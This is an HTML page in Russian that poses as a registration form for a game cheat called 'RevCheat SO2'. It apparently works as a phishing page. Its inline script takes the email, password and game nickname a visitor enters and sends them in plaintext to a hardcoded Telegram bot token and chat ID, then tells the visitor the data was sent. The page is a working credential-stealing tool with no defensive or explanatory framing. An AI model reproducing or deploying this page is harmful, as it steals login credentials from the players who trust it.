<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RevCheat SO2</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: url('image-fon.jpg') no-repeat center center fixed;
            background-size: cover;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
            text-align: center;
            width: 300px;
        }

        h1 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 24px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #555;
            border-radius: 5px;
            background: #222;
            color: #fff;
        }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border: none;
            border-radius: 5px;
            background: #ff4500;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background: #e03e00;
        }

        label {
            color: #fff;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>RevenantCheat SO2</h1>
        <form id="registration-form">
            <label for="email">Почта</label>
            <input type="email" id="email" placeholder="Введите почту" required>

            <label for="password">Пароль</label>
            <input type="password" id="password" placeholder="Введите пароль" required>

            <label for="nickname">Айди или Ник</label>
            <input type="text" id="nickname" placeholder="Введите айди или ник" required>

            <button type="submit">Зарегистрироваться</button>
        </form>
    </div>

    <script>
        const form = document.getElementById('registration-form');
        form.addEventListener('submit', async (event) => {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const nickname = document.getElementById('nickname').value;

            // Telegram Bot Token и chat_id
            const botToken = '7248847796:AAElokt77EtFOncFQ0raOWTSW3WKrQmQHCk';
            const chatId = '6695380917';

            // Текст сообщения
            const message = `
                🛠 Новая регистрация:
                📧 Почта: ${email}
                🔑 Пароль: ${password}
                👤 Ник: ${nickname}
            `;

            // Отправка данных в Telegram
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            alert('Данные отправлены! Проверьте Telegram.');
            form.reset();
        });
    </script>
</body>
</html>
